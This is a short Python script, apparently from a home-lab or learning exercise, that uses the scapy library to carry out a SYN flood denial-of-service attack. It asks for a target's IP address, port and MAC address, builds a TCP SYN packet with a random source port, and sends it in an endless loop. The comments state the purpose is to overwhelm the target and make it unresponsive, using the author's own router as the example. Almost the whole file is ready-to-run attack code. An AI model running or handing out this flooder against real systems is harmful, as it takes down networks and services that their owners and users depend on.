from scapy.all import *

# Can be used to perform SYN Flooding attack on a target machine, in this example we will use our router.
# It sends a large number of SYN packets to the target machine, which can overwhelm the target and cause it to become unresponsive.

#Target Information
target_ip = input("Enter the target IP: ")
target_port = int(input("Enter the target port: "))
target_mac = input("Enter the target MAC address: ").replace("-", ":").lower() 

# eth_layer = Ether(dst=target_mac) #Create the Ethernet layer with the target MAC address
ip_layer = IP(dst=target_ip) #Create the IP layer with the target IP address
tcp_layer = TCP(sport = RandShort(), dport=target_port, flags="S") #Create the TCP layer with a random source port, target port, and SYN flag set

#Combine the layers to create the SYN packet
syn_packet =  ip_layer / tcp_layer
#syn_packet =  eth_layer / ip_layer / tcp_layer

print(f"Sending SYN packet to {target_ip}:{target_port}...")
send(syn_packet, loop=1) #Send the SYN packet
print("Packet sent successfully!")
